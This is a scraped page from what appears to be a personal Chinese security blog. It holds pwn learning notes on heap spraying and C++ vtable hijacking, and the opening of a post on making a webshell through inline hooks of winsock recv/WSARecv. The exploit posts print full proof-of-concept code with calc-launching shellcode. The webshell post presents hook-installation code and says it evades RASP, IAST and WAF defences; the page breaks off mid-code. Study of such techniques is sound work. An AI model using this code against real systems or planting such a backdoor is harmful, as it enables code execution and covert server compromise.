class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALLOC_SIZE 0x100000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">pwn</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 弹计算器</span></span><br><span class="line"><span class="keyword">char</span> shellcode[] = <span class="string">"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"</span></span><br><span class="line"><span class="string">"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"</span></span><br><span class="line"><span class="string">"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"</span></span><br><span class="line"><span class="string">"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"</span></span><br><span class="line"><span class="string">"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"</span></span><br><span class="line"><span class="string">"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"</span></span><br><span class="line"><span class="string">"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"</span></span><br><span class="line"><span class="string">"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"</span></span><br><span class="line"><span class="string">"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"</span></span><br><span class="line"><span class="string">"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"</span></span><br><span class="line"><span class="string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"</span></span><br><span class="line"><span class="string">"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"</span></span><br><span class="line"><span class="string">"\x00\x53\xff\xd5\x63\x61\x6c\x63\x00"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> msg[<span class="number">128</span>];</span><br><span class="line"></span><br><span class="line">	A* a = <span class="keyword">new</span> A;</span><br><span class="line">	<span class="keyword">long</span>* a_addr = (<span class="keyword">long</span>*) a;</span><br><span class="line">	<span class="keyword">long</span>* vptr = (<span class="keyword">long</span>*) ( *a_addr);</span><br><span class="line"></span><br><span class="line">	a_addr[<span class="number">0</span>] = <span class="number">0x0C0C0C0C</span>; <span class="comment">// 修改 vptr</span></span><br><span class="line"></span><br><span class="line">	sprintf_s(msg, <span class="string">"object a address: 0x%p"</span>, a_addr);</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; msg &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	sprintf_s(msg, <span class="string">"vtable address: 0x%p"</span>, vptr[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; msg &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span> ; i++) &#123; <span class="comment">// 模拟堆喷，申请大量内存，256 个 chunk</span></span><br><span class="line">		<span class="keyword">long</span>* buf = (<span class="keyword">long</span>*) <span class="built_in">malloc</span>(ALLOC_SIZE); <span class="comment">// 1MB</span></span><br><span class="line"></span><br><span class="line">		sprintf_s(msg, <span class="string">"chunk[%d] addr: 0x%p"</span>, i, buf);</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; msg &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>((<span class="keyword">long</span>) buf == <span class="number">0</span>) <span class="keyword">break</span>; <span class="comment">// 内存不足 malloc 失败</span></span><br><span class="line"></span><br><span class="line">		<span class="built_in">memset</span>(buf, <span class="number">0x0c</span>, ALLOC_SIZE - <span class="keyword">sizeof</span>(shellcode)); <span class="comment">// 填充 slides</span></span><br><span class="line">		<span class="keyword">if</span>((<span class="keyword">long</span>) buf + ALLOC_SIZE &gt; <span class="number">0x0c0c0c0c</span> &amp;&amp; (<span class="keyword">long</span>) buf &lt; <span class="number">0x0c0c0c0c</span>)&#123; <span class="comment">// 此处判断可以省略</span></span><br><span class="line">			<span class="built_in">memset</span>(buf, <span class="number">0x0c</span>, ALLOC_SIZE - <span class="keyword">sizeof</span>(shellcode)); <span class="comment">// 填充 slides</span></span><br><span class="line">			<span class="built_in">memcpy</span>(buf + (ALLOC_SIZE - <span class="keyword">sizeof</span>(shellcode))/<span class="number">4</span>, shellcode, <span class="keyword">sizeof</span>(shellcode)); <span class="comment">// 写 shellcode</span></span><br><span class="line">			system(<span class="string">"pause"</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line"></span><br><span class="line">	a-&gt;pwn(); <span class="comment">// 调用虚函数</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行程序</p>
+<p><img src="/2021/07/07/realpwn-heap-spary-exercise/1.png" alt="1"></p>
+<p>代码里直接把 vptr 已经修改成 <code>0x0C0C0C0C</code> ，模拟虚函数表劫持。</p>
+<p><code>bp 0x0c0c0c0c</code> 打上断点，继续。</p>
+<p><img src="/2021/07/07/realpwn-heap-spary-exercise/2.png" alt="2"></p>
+<p><img src="/2021/07/07/realpwn-heap-spary-exercise/3.png" alt="3"></p>
+<p>这里模拟了堆喷的过程，申请到的 <code>0x0C0C0C0C</code> 在 <code>chunk\[158\]</code> 里。</p>
+<blockquote>
+<p>可以看到在向堆申请空间时，地址是从小到大的，有一定随机性，且有概率申请不到 <code>0x0C0C0C0C</code> ，这可能也是二进制漏洞利用不如web漏洞利用稳定的原因之一。</p>
+</blockquote>
+<p><img src="/2021/07/07/realpwn-heap-spary-exercise/4.png" alt="4"></p>
+<p><img src="/2021/07/07/realpwn-heap-spary-exercise/5.png" alt="5"></p>
+<p>现在已经 slides 和 shellcode 都写上去了。</p>
+<p>继续，就到调用虚函数了，顺利的话就会弹出计算器。</p>
+<blockquote>
+<p>注意，<code>malloc</code> 的内存默认只有 RW 权限，同 <a href="https://jayl1n.github.io/2021/07/04/realpwn-vtable-hijacking-exercise/">【RealPwn-1】 虚函数表劫持练习</a> 一样，需要暂时关闭 DEP 才能执行 shellcode，实际场景中需要构造 ROP 链。</p>
+</blockquote>
+<p><img src="/2021/07/07/realpwn-heap-spary-exercise/heap-spary.gif" alt="6"></p>
+<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ul>
+<li><a href="https://v1ckydxp.github.io/2019/07/22/2019-07-22-%E5%A0%86%E5%96%B7%E5%B0%84&amp;%E5%A0%86%E9%A3%8E%E6%B0%B4/" target="_blank" rel="noopener">Heap Spray（堆喷射）简介</a></li>
+</ul>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/Pwn/">Pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/二进制/">二进制</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-realpwn-vtable-hijacking-exercise" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="2021/07/04/realpwn-vtable-hijacking-exercise/" class="article-date">
+      <time datetime="2021-07-04T02:54:28.000Z" itemprop="datePublished">2021-07-04</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="2021/07/04/realpwn-vtable-hijacking-exercise/">【RealPwn-1】 虚函数表劫持练习</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <blockquote>
+<p>[RealPwn] 系列是我学习 pwn 的笔记，只记录真实场景中常用到的漏洞利用技术。</p>
+</blockquote>
+<h1 id="虚函数表"><a href="#虚函数表" class="headerlink" title="虚函数表"></a>虚函数表</h1><p>C++ 里，为了实现 “多态” ，使用了虚函数表 (vtable)。</p>
+<p>每个含有虚函数的类的对象，在内存的起始处有一个 vptr 的指针，指向虚函数表。</p>
+<p>虚函数表存了类里所有虚函数的指针。调用函数时，在这个虚函数表里查找实际要调用的函数。</p>
+<p>借用网上的一张图</p>
+<p><img src="/2021/07/04/realpwn-vtable-hijacking-exercise/vft.png" alt="vft.png"></p>
+<h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><p>总结下虚函数表的特性：</p>
+<ol>
+<li><p>虚函数表在 <code>.data</code> 段，仅可读，无法修改</p>
+</li>
+<li><p>虚函数表类似一个数组，每个有虚函数的类的对象实例都存储指向虚函数表的指针。</p>
+</li>
+<li><p>虚函数表指针 vptr 一般在对象起始的 4 字节（32 位） 或 8 字节（64 位），多重继承时有可能存在多个虚函数表，</p>
+</li>
+</ol>
+<h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p>下面调试一下，环境 VS2019 + x32dbg：</p>
+<p>代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">class A &#123;</span><br><span class="line">public :</span><br><span class="line">	virtual int hijackme() &#123;</span><br><span class="line">		return 1;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">	char msg[128];</span><br><span class="line"></span><br><span class="line">	A* a = new A;</span><br><span class="line">	long* a_addr = (long*) a;</span><br><span class="line">	long* vptr = (long*) ( *a_addr);</span><br><span class="line"></span><br><span class="line">	sprintf(msg, &quot;object a address: 0x%p&quot;, a_addr);</span><br><span class="line">	cout &lt;&lt; msg &lt;&lt; endl;</span><br><span class="line">	sprintf(msg, &quot;vtable address: 0x%p&quot;, vptr[0]);</span><br><span class="line">	cout &lt;&lt; msg &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	system(&quot;pause&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/07/04/realpwn-vtable-hijacking-exercise/image-20210702163648268.png" alt="image-20210702163648268"></p>
+<p>x32dbg 里看内存</p>
+<p><img src="/2021/07/04/realpwn-vtable-hijacking-exercise/image-20210702163707394.png" alt="image-20210702163707394"></p>
+<p><code>0x014FD028</code> 是 vptr ，指向虚函数表。</p>
+<p><img src="/2021/07/04/realpwn-vtable-hijacking-exercise/image-20210702163900420.png" alt="image-20210702163900420"></p>
+<p><code>0xB131EC</code> 是虚函数表，所在内存是只读的无法修改，它指向的是函数实际的地址，无法修改虚表中函数的地址。</p>
+<p><img src="/2021/07/04/realpwn-vtable-hijacking-exercise/image-20210702164047943.png" alt="image-20210702164047943"></p>
+<p>对象是在堆上的，它的内存是 <code>RW</code> 可读可写的，常见的攻击思路是修改对象的虚函数表指针 vptr ，即 <code>0x014FD028</code> 中的数据。</p>
+<p><img src="/2021/07/04/realpwn-vtable-hijacking-exercise/image-20210702164627019.png" alt="image-20210702164627019"></p>
+<p>试验一下。</p>
+<p>要在内存中伪造出一个虚表，将对象的虚表指针指向它。</p>
+<p>修改代码</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span> :</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">hijackme</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 弹计算器</span></span><br><span class="line"><span class="keyword">char</span> shellcode[<span class="number">0x1000</span>] = <span class="string">"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"</span></span><br><span class="line"><span class="string">"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"</span></span><br><span class="line"><span class="string">"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"</span></span><br><span class="line"><span class="string">"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"</span></span><br><span class="line"><span class="string">"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"</span></span><br><span class="line"><span class="string">"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"</span></span><br><span class="line"><span class="string">"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"</span></span><br><span class="line"><span class="string">"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"</span></span><br><span class="line"><span class="string">"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"</span></span><br><span class="line"><span class="string">"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"</span></span><br><span class="line"><span class="string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"</span></span><br><span class="line"><span class="string">"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"</span></span><br><span class="line"><span class="string">"\x00\x53\xff\xd5\x63\x61\x6c\x63\x00"</span>;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> msg[<span class="number">128</span>];</span><br><span class="line"></span><br><span class="line">	A* a = <span class="keyword">new</span> A;</span><br><span class="line">	<span class="keyword">long</span>* a_addr = (<span class="keyword">long</span>*) a;</span><br><span class="line">	<span class="keyword">long</span>* vptr = (<span class="keyword">long</span>*) ( *a_addr );</span><br><span class="line"></span><br><span class="line">	<span class="built_in">sprintf</span>(msg, <span class="string">"object a address: 0x%p"</span>, a_addr);</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; msg &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">sprintf</span>(msg, <span class="string">"vtable address: 0x%p"</span>, vptr[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; msg &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> fake_vtable[<span class="number">4</span>]; <span class="comment">//伪造一个虚表</span></span><br><span class="line">	<span class="keyword">long</span> shellcode_addr = (<span class="keyword">long</span>)((<span class="keyword">long</span>*) (shellcode));</span><br><span class="line">	<span class="built_in">memcpy</span>(fake_vtable, &amp;shellcode_addr ,<span class="number">4</span>); <span class="comment">//虚表指向shellcode</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">sprintf</span>(msg, <span class="string">"fake_vtable address: 0x%p"</span>, &amp;fake_vtable);</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; msg &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">sprintf</span>(msg, <span class="string">"shellcode address: 0x%p"</span>, (<span class="keyword">long</span>*) shellcode);</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; msg &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">long</span> fake_vtable_addr = (<span class="keyword">long</span>) ( (<span class="keyword">long</span>*) fake_vtable );</span><br><span class="line">	<span class="built_in">memcpy</span>(tmp, &amp;fake_vtable_addr, <span class="number">4</span>); <span class="comment">// 修改对象虚表指针，指向伪造的虚表</span></span><br><span class="line"></span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line"></span><br><span class="line">	a-&gt;hijackme();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>重新执行</p>
+<p><img src="/2021/07/04/realpwn-vtable-hijacking-exercise/image-20210702175254591.png" alt="image-20210702175254591"></p>
+<p>在 <code>0x00DCFE44</code> 处构造一个虚表，只要一个项，指向 <code>0x00535020</code> 。</p>
+<p><img src="/2021/07/04/realpwn-vtable-hijacking-exercise/image-20210702174543785.png" alt="image-20210702174543785"></p>
+<p><code>0x00535020</code> 是 shellcode</p>
+<p><img src="/2021/07/04/realpwn-vtable-hijacking-exercise/image-20210702174636492.png" alt="image-20210702174636492"></p>
+<p>这里涉及到一个问题，shellcode 是在 <code>.data</code> 段不可执行的，一般来说需要构造 ROP 链，给 shellcode 所在内存加上执行权限。这里略过这个问题，暂时先关掉 DEP（属性 —&gt; 链接器 —&gt; 高级）。</p>
+<p><img src="/2021/07/04/realpwn-vtable-hijacking-exercise/image-20210702173559882.png" alt="image-20210702173559882"></p>
+<p>应该就可以执行 shellcode 了。</p>
+<p><img src="/2021/07/04/realpwn-vtable-hijacking-exercise/vtable-hijacking.gif" alt="vtable-hijacking"></p>
+<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="http://pwn4.fun/2016/11/20/C-%E8%99%9A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%94%BB%E9%98%B2%E6%88%98/" target="_blank" rel="noopener">C++虚函数调用攻防战</a></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/Pwn/">Pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/二进制/">二进制</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-use-inlinehook-technology-to-make-a-more-general-webshell" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="2021/07/01/use-inlinehook-technology-to-make-a-more-general-webshell/" class="article-date">
+      <time datetime="2021-07-01T12:08:53.000Z" itemprop="datePublished">2021-07-01</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="2021/07/01/use-inlinehook-technology-to-make-a-more-general-webshell/">利用 Hook 技术打造通用的 Webshell</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <blockquote>
+<p>本文首发 <a href="https://xz.aliyun.com/t/9774" target="_blank" rel="noopener">https://xz.aliyun.com/t/9774</a></p>
+</blockquote>
+<blockquote>
+<p>标题中的 “通用” 指跨语言，本文的实现是基于 Windows 的，需要 Linux 的可以参考本文的思路，实现起来并没有太大区别。</p>
+</blockquote>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>Windows 上程序涉及网络 socket 操作，一般都会用到 winsock2 的库，程序会动态链接 <code>ws2_32.dll</code> ，JVM，Python，Zend 等解释器都不例外。</p>
+<p>winsock2 里 socket 操作相关的函数 <code>recv</code> <code>send</code> <code>closesocket</code> 会编程的应该都不陌生。<strong>hook 掉 <code>recv</code> 函数就可以在程序处理接受到网络数据前，进入我们的处理逻辑早一步收到数据。</strong></p>
+<p>由于实现是 native 的，所以在成功 hook 的情况下能绕过现代的 RASP、IAST、云WAF 等现代流行的防护技术。</p>
+<h1 id="Inline-Hook"><a href="#Inline-Hook" class="headerlink" title="Inline Hook"></a>Inline Hook</h1><p>Inline Hook 是在程序运行时直接修改指令，插入跳转指令（jmp/call/retn）来控制程序执行流的一种技术。相比别的 Hook 技术，Inline Hook 优点是能跨平台，稳定，本文是以此技术实现的。</p>
+<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>具体实现分为两个部分，一个是hook函数的 DLL(只讲这个)；另一个是向进程注入 DLL 的辅助工具(网上的文章很多，需要的见完整源码)。</p>
+<h2 id="InstallHook"><a href="#InstallHook" class="headerlink" title="InstallHook"></a>InstallHook</h2><p>安装钩子</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> START_BLOCK <span class="meta-string">"#CMD0#"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> END_BLOCK <span class="meta-string">"#CMD1#"</span></span></span><br><span class="line"></span><br><span class="line">DWORD dwInstSize = <span class="number">12</span>;</span><br><span class="line">BYTE RecvEntryPointInst[<span class="number">12</span>] = &#123; <span class="number">0x00</span> &#125;;</span><br><span class="line">BYTE RecvEntryPointInstHook[<span class="number">12</span>] = &#123; <span class="number">0x48</span>, <span class="number">0xB8</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span> &#125;;</span><br><span class="line">BYTE WSARecvEntryPointInst[<span class="number">12</span>] = &#123; <span class="number">0x00</span> &#125;;</span><br><span class="line">BYTE WSARecvEntryPointInstHook[<span class="number">12</span>] = &#123; <span class="number">0x48</span>, <span class="number">0xB8</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">( *PFNRecv )</span><span class="params">( SOCKET, <span class="keyword">char</span>*, <span class="keyword">int</span>, <span class="keyword">int</span> )</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">( *PFNSend )</span><span class="params">( SOCKET, <span class="keyword">char</span>*, <span class="keyword">int</span>, <span class="keyword">int</span> )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">( *PFNWSARecv )</span> <span class="params">( SOCKET, LPWSABUF, DWORD, LPDWORD, LPDWORD, LPWSAOVERLAPPED, LPWSAOVERLAPPED_COMPLETION_ROUTINE )</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">( *PFNWSASend )</span> <span class="params">( SOCKET, LPWSABUF, DWORD, LPDWORD, LPDWORD, LPWSAOVERLAPPED, LPWSAOVERLAPPED_COMPLETION_ROUTINE )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InstallHook</span><span class="params">(LPCWSTR lpModule, LPCSTR lpFuncName, LPVOID lpFunction)</span> </span>&#123;</span><br><span class="line">	DWORD_PTR FuncAddress = (UINT64) GetProcAddress(GetModuleHandleW(lpModule), lpFuncName);</span><br><span class="line">	DWORD OldProtect = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(VirtualProtect((LPVOID) FuncAddress, dwInstSize, PAGE_EXECUTE_READWRITE, &amp;OldProtect))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(lpFuncName, <span class="string">"recv"</span>)) &#123;</span><br><span class="line">			<span class="built_in">memcpy</span>(RecvEntryPointInst, (LPVOID) FuncAddress, dwInstSize);</span><br><span class="line">			*(PINT64) ( RecvEntryPointInstHook + <span class="number">2</span> ) = (UINT64) lpFunction;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(lpFuncName, <span class="string">"WSARecv"</span>)) &#123;</span><br><span class="line">			<span class="built_in">memcpy</span>(WSARecvEntryPointInst, (LPVOID) FuncAddress, dwInstSize);</span><br><span class="line">			*(PINT64) ( WSARecvEntryPointInstHook + <span class="number">2</span> ) = (UINT64) lpFunction;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(lpFuncName, <span class="string">"recv"</span>)) </span><br><span class="line">		<span class="built_in">memcpy</span>((LPVOID) FuncAddress, &amp;RecvEntryPointInstHook, <span class="keyword">sizeof</span>(RecvEntryPointInstHook));</span><br><span class="line">	<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(lpFuncName,<span class="string">"WSARecv"</span>))</span><br><span class="line">		<span class="built_in">memcpy</span>((LPVOID) FuncAddress, &amp;WSARecvEntryPointInstHook, <span 